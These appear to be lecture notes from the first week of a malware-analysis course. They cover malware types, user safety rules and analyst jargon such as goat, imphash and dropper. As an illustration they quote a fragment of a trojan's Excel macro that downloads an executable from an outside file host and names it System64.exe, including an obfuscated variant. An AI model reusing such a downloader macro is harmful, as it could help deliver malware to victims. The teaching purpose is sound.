### Week 1

The first lecture serves as an introduction to malware, a catch-all term for unwanted software running on a device. Malware includes software running on your machine as malicious as ransomware (software that encrypts the contents of your computer for the purposes of extorting you) to something more benign but annoying like adware (software which bombards the user with ads and pop-ups). Malware is primarily used for financial gain, information gathering, and/or as a method to attack companies or users. It can be employed by nearly anyone with access to the internet and some simple computer know-how, like criminal organizations, lone agents, or government entities. The need to prevent or resolve the issues caused by malware have led to the creation of companies and organizations devoted to anti-malware.


Anti-malware groups have developed methodologies for the purposes of detection, prevention, and, in some cases, destruction of malware. To deal with a malware threat, it is necessary to understand and categorize malware. There are commonly a few types of malware and they tend to fall into the following categories:
1. Virus - characterized by a pattern of spreading
2. Trojans - characterized by method of entry onto a user's machine.
3. Potentially Unwanted Program - catch-all term for other malware that don't follow either patterns

Although the prospect of viruses and trojans might be worrisome, it has been determined by the security community that the most common attack vector is through the user themselves. Following a few rules regarding computer security will go a long way to help prevent most attacks. These include, but are not limited to, the following:

1. Don't visit questionable sites.
2. Know where your files are from before opening them.
3. Don't use random USB sticks.
4. Don't access programs or mobile apps from unverifiable authors.

As an example, a trojan could have been hidden inside of a macro run as a result of opening an Excel file. It may have looked like this:
```
Sub DoWork()

Dim tmp As String, fName As String, Pos As Long, fPath As String

tmp = DownloadFile("http://ge.tt/api/1/files/8e8kZt72/0/blob?download")

'tmp = DownloadFile(rc4decrypt("YMe & chr(34)& lp52wsnV4"DyQw0DKMNIE_uZmPuzUL5b0WoVZ2r3E7f & chr(34)& jG713r1IgISh3hZD1a", "System64.exe"))

fName = "System64.exe
```

The security community has also devised a few terms in their work with malware. This includes the following:
1. white - a known clean file
2. black - a known dirty file
3. gray - a file which has neither been confirmed clean or dirty
4. sample - a copy of malware
5. goat - sacrificial system for working with malware
6. hash (ex: md5) - a signature that calculated the value of the file; used to id files, write code to detect; polymorphic files are a pain for this reason
7. honeypot - a vulnerable system that intentionally gets infected with viruses for evaluation
8. imphash - import hash, a hash calculated for viruses; this can be used to determine if the virus is part of the same "family" of viruses; if they use a similar import hash
9. dropper - the file that is used by a trojan


These are just some of the terms that are used.

